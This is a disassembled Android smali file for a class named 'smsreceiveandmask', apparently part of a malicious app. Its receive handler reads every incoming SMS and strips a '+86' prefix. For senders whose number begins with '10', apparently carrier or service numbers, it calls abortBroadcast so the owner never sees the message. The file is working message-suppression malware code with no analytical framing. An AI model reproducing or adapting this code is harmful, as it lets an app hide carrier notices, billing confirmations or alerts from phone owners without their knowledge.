.class public Lfish/smsreceiveandmask;
.super Landroid/content/BroadcastReceiver;
.source "smsreceiveandmask.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    #p0=(Reference,Lfish/smsreceiveandmask;);
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 15
    new-instance v1, Ljava/lang/StringBuilder;

    #v1=(UninitRef,Ljava/lang/StringBuilder;);
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 16
    .local v1, body:Ljava/lang/StringBuilder;
    #v1=(Reference,Ljava/lang/StringBuilder;);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef,Ljava/lang/StringBuilder;);
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 17
    .local v7, number:Ljava/lang/StringBuilder;
    #v7=(Reference,Ljava/lang/StringBuilder;);
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    .line 18
    .local v2, bundle:Landroid/os/Bundle;
    #v2=(Reference,Landroid/os/Bundle;);
    if-eqz v2, :cond_2

    .line 19
    const-string v9, "pdus"

    #v9=(Reference,Ljava/lang/String;);
    invoke-virtual {v2, v9}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    #v0=(Reference,Ljava/lang/Object;);
    check-cast v0, [Ljava/lang/Object;

    .line 20
    .local v0, _pdus:[Ljava/lang/Object;
    array-length v9, v0

    #v9=(Integer);
    new-array v6, v9, [Landroid/telephony/SmsMessage;

    .line 21
    .local v6, message:[Landroid/telephony/SmsMessage;
    #v6=(Reference,[Landroid/telephony/SmsMessage;);
    const/4 v5, 0x0

    .local v5, i:I
    :goto_0
    #v5=(Integer);v9=(Conflicted);
    array-length v9, v0

    #v9=(Integer);
    if-lt v5, v9, :cond_3

    .line 24
    array-length v9, v6

    const/4 v10, 0x0

    :goto_1
    #v3=(Conflicted);v10=(Integer);v11=(Conflicted);
    if-lt v10, v9, :cond_4

    .line 29
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 30
    .local v8, smsNumber:Ljava/lang/String;
    #v8=(Reference,Ljava/lang/String;);
    const-string v9, "+86"

    #v9=(Reference,Ljava/lang/String;);
    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    #v9=(Boolean);
    if-eqz v9, :cond_0

    .line 31
    const/4 v9, 0x3

    #v9=(PosByte);
    invoke-virtual {v8, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    .line 34
    :cond_0
    const/4 v4, 0x0

    .line 35
    .local v4, flags_filter:Z
    #v4=(Null);
    const-string v9, "10"

    #v9=(Reference,Ljava/lang/String;);
    invoke-virtual {v8, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    #v9=(Boolean);
    if-eqz v9, :cond_1

    .line 36
    const/4 v4, 0x1

    .line 39
    :cond_1
    #v4=(Boolean);
    if-eqz v4, :cond_2

    .line 40
    invoke-virtual {p0}, Lfish/smsreceiveandmask;->abortBroadcast()V

    .line 44
    .end local v0           #_pdus:[Ljava/lang/Object;
    .end local v4           #flags_filter:Z
    .end local v5           #i:I
    .end local v6           #message:[Landroid/telephony/SmsMessage;
    .end local v8           #smsNumber:Ljava/lang/String;
    :cond_2
    #v0=(Conflicted);v4=(Conflicted);v5=(Conflicted);v6=(Conflicted);v8=(Conflicted);v9=(Conflicted);v10=(Conflicted);
    return-void

    .line 22
    .restart local v0       #_pdus:[Ljava/lang/Object;
    .restart local v5       #i:I
    .restart local v6       #message:[Landroid/telephony/SmsMessage;
    :cond_3
    #v0=(Reference,[Ljava/lang/Object;);v3=(Uninit);v4=(Uninit);v5=(Integer);v6=(Reference,[Landroid/telephony/SmsMessage;);v8=(Uninit);v9=(Integer);v10=(Uninit);v11=(Uninit);
    aget-object v9, v0, v5

    #v9=(Reference,Ljava/lang/Object;);
    check-cast v9, [B

    invoke-static {v9}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v9

    aput-object v9, v6, v5

    .line 21
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 24
    :cond_4
    #v3=(Conflicted);v9=(Integer);v10=(Integer);v11=(Conflicted);
    aget-object v3, v6, v10

    .line 25
    .local v3, currentMessage:Landroid/telephony/SmsMessage;
    #v3=(Reference,Landroid/telephony/SmsMessage;);
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v11

    #v11=(Reference,Ljava/lang/String;);
    invoke-virtual {v1, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 26
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 24
    add-int/lit8 v10, v10, 0x1

    goto :goto_1
.end method
